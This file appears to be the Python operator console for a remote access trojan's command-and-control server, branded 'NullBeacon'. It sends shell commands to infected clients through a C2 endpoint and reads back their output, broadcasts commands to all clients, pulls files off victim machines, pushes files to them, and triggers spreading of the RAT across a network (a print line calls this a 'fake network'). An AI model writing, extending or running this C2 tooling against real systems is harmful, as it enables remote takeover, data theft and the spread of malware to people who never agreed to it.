import requests
import time
import argparse

C2_SERVER = "http://localhost:7777"  # or your actual IP

def interactive_shell(client):
    print(f"💀 NullBeacon Shell (CLI Mode) — type 'exit' to quit. Connected to {client}.\n")
    while True:
        cmd = input(" > ")
        if cmd.lower() == "exit":
            break
        try:
            requests.post(f"{C2_SERVER}/set", data=cmd)
            time.sleep(2)
            result = requests.get(f"{C2_SERVER}/last").text
            print(result.strip())
        except Exception as e:
            print("[-] Error:", e)

def select_client():
    response = requests.get(f"{C2_SERVER}/clients")
    clients = response.json().get('clients', [])
    if not clients:
        print("No clients connected!")
        return None
    print("Select client to control:")
    for idx, client in enumerate(clients, 1):
        print(f"{idx}. {client}")
    try:
        choice = int(input("Choice: "))
        selected_client = clients[choice - 1]
        return selected_client
    except (ValueError, IndexError):
        print("Invalid choice!")
        return None

def broadcast_command():
    cmd = input("Command to broadcast to all clients: ").strip()
    try:
        requests.post(f"{C2_SERVER}/broadcast", data=cmd)
        print(f"[*] Broadcast command sent: {cmd}")
    except Exception as e:
        print("[-] Broadcast failed:", e)


def show_menu():
    while True:
        print("\n=== NullBeacon C2 Menu ===")
        print("1. Run shell command")
        print("2. Upload file from client")
        print("3. Download file to client")
        print("4. Spread to network")
        print("5. Broadcast command to all clients")  # NEW
        print("6. Exit")


        choice = input("Choice: ").strip()
        client = select_client()
        if client is None:
            continue

        if choice == "1":
            interactive_shell(client)
        elif choice == "2":
            upload_file(client)
        elif choice == "3":
            download_file(client)
        elif choice == "4":
            spread_rats(client)
        elif choice == "5":
            broadcast_command()
        elif choice == "6":
            break
        
        else:
            print("Invalid option.")

def spread_rats(client):
    print("[*] Spreading RAT to all devices in fake network...")
    requests.post(f"{C2_SERVER}/spread")
    print("[*] Spread command sent.")

def upload_file(client):
    path = input("Path to file on client to upload: ").strip()
    try:
        requests.post(f"{C2_SERVER}/set", data=f"upload {path}")
        print("[*] Upload command sent.")
    except Exception as e:
        print("[-] Failed:", e)

def download_file(client):
    filename = input("Filename to send to client: ").strip()
    try:
        requests.post(f"{C2_SERVER}/set", data=f"download {filename}")
        print("[*] Download command sent.")
    except Exception as e:
        print("[-] Failed:", e)

def main():
    parser = argparse.ArgumentParser(description="NullBeacon Attacker Interface")
    parser.add_argument("--cli", action="store_true", help="Launch interactive shell mode")
    args = parser.parse_args()

    if args.cli:
        client = select_client()
        if client:
            interactive_shell(client)
    else:
        show_menu()

if __name__ == "__main__":
    main()
